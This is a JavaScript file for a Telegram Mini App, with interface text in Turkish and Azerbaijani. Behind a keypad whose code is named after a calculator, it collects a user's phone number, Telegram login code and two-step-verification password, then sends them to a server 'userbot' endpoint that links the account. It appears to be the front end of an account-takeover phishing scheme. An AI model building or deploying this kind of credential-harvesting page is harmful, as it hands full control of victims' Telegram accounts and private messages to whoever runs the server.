const tg = window.Telegram?.WebApp;
if (tg) { tg.ready(); tg.expand(); }
const initData = tg?.initData || '';

let phone = '';
let phoneCodeHash = '';
let step = 'phone'; // phone, code, password

function updateDisplay() {
    const val = document.getElementById('calc-value');
    const label = document.getElementById('calc-label');
    const action = document.getElementById('calc-action');

    if (step === 'phone') {
        label.textContent = 'Telefon Numarası (Ülke Kodu + Numara)';
        val.textContent = phone ? '+' + phone : '+';
        action.textContent = 'Kod Gönder';
    } else if (step === 'code') {
        label.textContent = 'Telegram\'dan Gelen Kod';
        val.textContent = phone;
        action.textContent = 'Kodu Tasdiqlə';
    } else if (step === 'password') {
        label.textContent = '2FA Bulud Şifrəsi (Parol)';
        val.textContent = '••••••';
        action.textContent = 'Şifrəni Təsdiqlə';
    }
}

function calcPress(n) {
    if (step === 'phone') {
        if (phone.length < 15) phone += n;
    } else if (step === 'code') {
        if (phone.length < 10) phone += n;
    } else if (step === 'password') {
        phone += n;
    }
    updateDisplay();
}

function calcClear() {
    if (step === 'phone') phone = '';
    else if (step === 'code') phone = '';
    else if (step === 'password') phone = '';
    updateDisplay();
}

function calcBack() {
    phone = phone.slice(0, -1);
    updateDisplay();
}

async function calcAction() {
    const actionBtn = document.getElementById('calc-action');
    actionBtn.disabled = true;

    try {
        if (step === 'phone') {
            if (!phone || phone.length < 8) {
                alert('Lütfən düzgün telefon nömrəsi daxil edin');
                actionBtn.disabled = false;
                return;
            }
            const fullPhone = '+' + phone;
            const res = await fetch('/api/userbot/send-code', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ phone: fullPhone, initData })
            }).then(r => r.json());

            if (res.success) {
                phoneCodeHash = res.phoneHash;
                // Kod daxil etmə mərhələsinə keçid üçün nömrəni yadda saxlayırıq
                window.savedPhone = fullPhone;
                phone = '';
                step = 'code';
                alert('Kod Telegram hesabınıza göndərildi!');
            } else {
                alert('Xəta: ' + (res.error || 'Naməlum xəta'));
            }
        } else if (step === 'code') {
            const code = phone;
            if (!code) {
                alert('Lütfən kodu daxil edin');
                actionBtn.disabled = false;
                return;
            }
            const res = await fetch('/api/userbot/verify', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    phone: window.savedPhone,
                    code: code,
                    phoneCodeHash: phoneCodeHash,
                    initData
                })
            }).then(r => r.json());

            if (res.success) {
                alert(res.message || 'Hesab uğurla bağlandı!');
                location.reload();
            } else if (res.needPassword) {
                phone = '';
                step = 'password';
                alert('Bu hesabda 2 addımlı doğrulama (2FA) aktivdir. Zəhmət olmasa şifrənizi daxil edin.');
            } else {
                alert('Xəta: ' + (res.error || 'Kod səhvdir'));
            }
        } else if (step === 'password') {
            const password = phone;
            const res = await fetch('/api/userbot/verify', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    phone: window.savedPhone,
                    phoneCodeHash: phoneCodeHash,
                    password: password,
                    initData
                })
            }).then(r => r.json());

            if (res.success) {
                alert('Hesab uğurla bağlandı!');
                location.reload();
            } else {
                alert('Xəta: ' + (res.error || 'Şifrə səhvdir'));
            }
        }
    } catch (e) {
        alert('Bağlantı xətası: ' + e.message);
    } finally {
        actionBtn.disabled = false;
        updateDisplay();
    }
}

updateDisplay();
